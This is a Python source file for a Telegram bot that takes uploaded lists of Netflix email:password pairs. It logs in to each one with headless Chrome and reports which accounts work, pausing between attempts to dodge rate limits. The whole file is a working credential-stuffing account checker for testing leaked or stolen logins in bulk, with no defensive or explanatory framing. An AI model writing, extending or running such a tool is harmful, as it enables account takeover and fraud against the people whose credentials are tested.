from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
from telegram import Update
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time
import os
from webdriver_manager.chrome import ChromeDriverManager

# Bot token from environment variable
TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

# Function to check Netflix login
def check_netflix(email, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # Run in background
    chrome_options.add_argument("--no-sandbox")  # Required for Render
    chrome_options.add_argument("--disable-dev-shm-usage")  # Avoid memory issues
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    
    try:
        driver.get("https://www.netflix.com/login")
        time.sleep(2)

        # Enter email
        email_field = driver.find_element(By.NAME, "userLoginId")
        email_field.send_keys(email)

        # Enter password
        password_field = driver.find_element(By.NAME, "password")
        password_field.send_keys(password)

        # Click login button
        login_button = driver.find_element(By.CSS_SELECTOR, "button.login-button")
        login_button.click()
        time.sleep(5)

        # Check if login was successful
        if "profiles" in driver.current_url or "Who's Watching" in driver.title:
            return True, "Working"
        else:
            return False, "Not Working (Invalid credentials or CAPTCHA)"
    except Exception as e:
        return False, f"Error: {str(e)}"
    finally:
        driver.quit()

# /start command
def start(update: Update, context):
    update.message.reply_text("Hello! Send me a .txt file with Netflix IDs and passwords. Format: email:password (one per line).")

# Handle text file
def handle_file(update: Update, context):
    file = update.message.document
    if not file.file_name.endswith('.txt'):
        update.message.reply_text("Please send a .txt file only!")
        return

    # Download the file
    file_path = file.get_file().download()
    update.message.reply_text("File received! Checking IDs...")

    # Read the file
    working = []
    not_working = []
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            if ':' not in line:
                continue
            email, password = line.split(':', 1)
            update.message.reply_text(f"Checking {email}...")
            success, message = check_netflix(email, password)
            if success:
                working.append(f"{email}:{password} - {message}")
            else:
                not_working.append(f"{email}:{password} - {message}")
            time.sleep(3)  # Avoid rate limiting

    # Send results
    result = "=== Working Accounts ===\n" + "\n".join(working) + "\n\n=== Not Working ===\n" + "\n".join(not_working)
    if not working and not not_working:
        result = "No valid ID/password found."
    update.message.reply_text(result)

    # Clean up
    os.remove(file_path)

# Error handler
def error(update: Update, context):
    update.message.reply_text("Something went wrong. Try again.")
    print(f"Error: {context.error}")

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.document.mime_type("text/plain"), handle_file))
    dp.add_error_handler(error)

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
